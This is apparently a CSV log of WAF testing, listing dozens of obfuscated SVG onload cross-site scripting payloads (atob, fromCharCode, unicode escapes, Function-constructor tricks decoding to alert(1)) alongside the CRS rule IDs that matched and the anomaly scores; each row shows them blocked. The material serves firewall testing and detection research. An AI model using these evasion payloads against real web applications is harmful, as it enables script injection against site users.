index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
2710,"<svg onload=""this.remove();(Object.getPrototypeOf(function(){}).constructor(atob('YWxlcnQoMSk=')))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o50,11v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826959659.254338
2711,"<svg onload=""this.remove();(window['Function'.split('').join('')](atob('YWxlcnQoMSk=')))()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o27,63v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,37v217,92t:urlDecodeUni,t:compressWhitespace || ",25,177826959981.241714
2718,"<svg onload=""this.remove();(window.Function(atob('YWxlcnQoMSk=')))()""></svg>",0,1,block,4,"941100,941120,941160,949110","v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826961442.509042
2723,"<svg onload=""this.remove();(new(window.Function.bind(null,unescape('%61%6C%65%72%74%28%31%29'))))()""></svg>",0,1,block,4,"941100,941120,941160,949110","v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826962679.910998
2725,"<svg onload=""this.remove();(new[self.Function][0](unescape('%61%6C%65%72%74%28%31%29')))()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o27,47v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17782696311.382876
2730,"<svg onload=""this.remove();(new(top.Function)(unescape('%61%6C%65%72%74%28%31%29')))()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o27,43v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826964271.815963
2731,"<svg onload=""this.remove();(parent.Function(unescape('%61%6C%65%72%74%28%31%29')))()""></svg>",0,1,block,4,"941100,941120,941160,949110","v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826964527.953062
2732,"<svg onload=""this.remove();(frames.Function(unescape('%61%6C%65%72%74%28%31%29')))()""></svg>",0,1,block,4,"941100,941120,941160,949110","v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826964785.945242
2734,"<svg onload=""this.remove();(new(globalThis.Function)(unescape('%61%6C%65%72%74%28%31%29')))()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o27,50v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826965187.550257
2786,"<svg onload='top[""Function""](""al""+""er""+""t(1)"")()'></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,32v217,56t:urlDecode,t:replaceComments,t:compressWhitespace || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,56t:urlDecodeUni,t:compressWhitespace || ",25,177826977228.894244
2791,"<svg onload='(function(){return this})()[""al""+""ert""](1)'></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,42v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,63 || o14,11v217,63t:urlDecodeUni || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177826978364.451070
2798,"<svg onload='Function(atob(""YWxlcnQoMSk=""))()'></svg>",0,1,block,4,"941100,941120,941160,949110","v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826980082.668896
2799,"<svg onload='(function(){this[""ev\u0061l""](atob(""YWxlcnQoMSk=""))})()'></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,76 || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,17v217,76t:urlDecodeUni,t:compressWhitespace || ",25,177826980256.724498
2800,"<svg onload='(function(){window[""Function""](atob(""YWxlcnQoMSk=""))()})()'></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o13,58v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,18v217,79t:urlDecodeUni,t:compressWhitespace || ",30,177826980592.292113
2801,"<svg onload='(function(){[][""constructor""][""constructor""](atob(""YWxlcnQoMSk=""))()})()'></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,72v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826980767.028427
2802,"<svg onload='(function(){top[""\x65val""](atob(""YWxlcnQoMSk=""))})()'></svg>",0,1,block,7,"932105,934100,941100,941120,941160,941370,949110","o22,6v217,73 || o14,11v217,73 || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,14v217,73t:urlDecodeUni,t:compressWhitespace || ",30,177826981067.318223
2804,"<svg onload='(()=>globalThis.Function(atob(""YWxlcnQoMSk=""))())()'></svg>",0,1,block,4,"941100,941120,941160,949110","v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826981447.677119
2809,"<svg onload='(()=>{with(window)Function(atob(""YWxlcnQoMSk=""))()})()'></svg>",0,1,block,4,"941100,941120,941160,949110","v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826982629.190138
2813,"<svg onload='(()=>{Reflect.construct(Function,[atob(""YWxlcnQoMSk="")])()})()'></svg>",0,1,block,4,"941100,941120,941160,949110","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826983593.699213
2815,"<svg onload='(()=>{Reflect.apply(Function,null,[atob(""YWxlcnQoMSk="")])()})()'></svg>",0,1,block,4,"941100,941120,941160,949110","v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826984034.766841
2818,"<svg onload='(function(){var b=[""ale""+""rt""];window[b[0]](1)})()'>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o50,13v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,65 || o14,11v217,65t:urlDecodeUni || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,11v217,65t:urlDecodeUni,t:compressWhitespace || ",35,177826984752.486437
2819,"<svg onload='(function(){var c=String.fromCharCode(97,108,101,114,116);window[c](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o77,10v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o71,9v217,89t:urlDecodeUni,t:compressWhitespace || ",30,177826984958.150890
2820,"<svg onload='(function(){var d=atob(""YWxlcnQ="");window[d](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o54,10v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o48,9v217,66t:urlDecodeUni,t:compressWhitespace || ",30,177826985141.494315
2821,"<svg onload='(function(){var e=""a\u006c\u0065\u0072\u0074"";window[e](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o65,10v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,77t:urlDecodeUni,t:compressWhitespace || ",30,177826985418.973882
2824,"<svg onload='(function(){var h=""al""+""er""+""t"";top[h](1)})()'>",0,1,block,9,"932105,933210,934100,934100,941100,941120,941160,941370,949110","o44,4v217,60 || o48,10v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,60 || o14,11v217,60t:urlDecodeUni || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,6v217,60t:urlDecodeUni,t:compressWhitespace || ",40,177826986092.528943
2825,"<svg onload='(function(){var i=[""a"",""l"",""e"",""r"",""t""].join("""");window[i](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o68,10v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,80 || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,9v217,80t:urlDecodeUni,t:compressWhitespace || ",30,177826986319.434499
2827,"<svg onload='(function(){var k=atob(""YWxlcnQ"");self[k](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o51,10v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,7v217,63t:urlDecodeUni,t:compressWhitespace || ",30,177826986715.159363
2828,"<svg onload='(function(){var m=`${""a""}${""l""}${""e""}${""r""}${""t""}`;window[m](1)})()'>",0,1,block,8,"932130,933210,934100,941100,941120,941160,941370,949110","o31,35v217,82t:urlDecodeUni,t:cmdLine || o70,10v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o64,9v217,82t:urlDecodeUni,t:compressWhitespace || ",35,177826987057.419858
2829,"<svg onload='(function(){var n=""a"".concat(""l"",""e"",""r"",""t"");window[n](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o65,10v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,77t:urlDecodeUni,t:compressWhitespace || ",30,177826987299.195096
2831,"<svg onload='(function(){var q=[""ale""+""rt""];top[q[0]](1)})()'>",0,1,block,9,"932105,933210,934100,934100,941100,941120,941160,941370,949110","o43,4v217,62 || o47,13v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,62 || o14,11v217,62t:urlDecodeUni || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,8v217,62t:urlDecodeUni,t:compressWhitespace || ",40,17782698775.826769
2832,"<svg onload='(function(){var r=String[""fromCharCode""](97,108,101,114,116);self[r](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o37,51v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,90 || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o74,7v217,90t:urlDecodeUni,t:compressWhitespace || ",30,177826987975.695766
2833,"<svg onload='(function(){var s=[""al"",""ert""].join``;window[s](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o57,10v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o51,9v217,69t:urlDecodeUni,t:compressWhitespace || ",30,177826988171.401486
2836,<svg onload='(function(){var w=atob`YWxlcnQ`;window[w](1)})()'>,0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o51,10v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,9v217,63t:urlDecodeUni,t:compressWhitespace || ",30,177826988813.869874
2837,"<svg onload='(function(){var x=[""a""+""l""+""e""+""r""+""t""][0];window[x](1)})()'>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o62,10v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,74 || o14,11v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o56,9v217,74t:urlDecodeUni,t:compressWhitespace || ",35,177826989070.690272
2840,"<svg onload='(function(){var s=String;var f=s.fromCharCode;this[f(101,118,97,108)](f(97,108,101,114,116,40,49,41))})()'>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,120 || v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,23v217,120t:urlDecodeUni,t:compressWhitespace || ",25,177826989740.321939
2841,"<svg onload='(()=>{const b=atob(""YWxlcnQoMSk="");Function(b)()})()'>",0,1,block,5,"933210,941100,941120,941160,949110","o56,9v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826989990.455402
2842,"<svg onload='(function(){var a=[String.fromCharCode(97),String.fromCharCode(108),String.fromCharCode(101),String.fromCharCode(114),String.fromCharCode(116)].join("""");window[a](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o172,10v217,184t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,184 || v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o166,9v217,184t:urlDecodeUni,t:compressWhitespace || ",30,177826990237.095690
2843,"<svg onload='(function(){var g=globalThis;var c=g.String.fromCharCode;g[c(101,118,97,108)](c(97,108,101,114,116,40,49,41))})()'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,128 || v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826990493.449778
2848,"<svg onload='(function(){var h=top;var i=h.String;var j=i.fromCharCode;h[j(101,118,97,108)](j(97,108,101,114,116,40,49,41))})()'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,129 || v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826991695.047675
2850,"<svg onload='(function(){var n=self;var o=n.String;var r=o[""from""+""CharCode""];n[r(101)+r(118)+r(97)+r(108)](r(97,108,101,114,116,40,49,41))})()'>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o79,64v217,145t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,145 || o14,11v217,145t:urlDecodeUni || v217,145t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,145t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,145t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177826992056.317817
2853,"<svg onload='(()=>{let arr=[...atob(""YWxlcnQ="")].map(c=>c.charCodeAt());Function(String.fromCharCode(...arr,40,49,41))()})()'>",0,1,block,5,"934100,941100,941120,941160,949110","o81,19v217,126 || v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826992832.196862
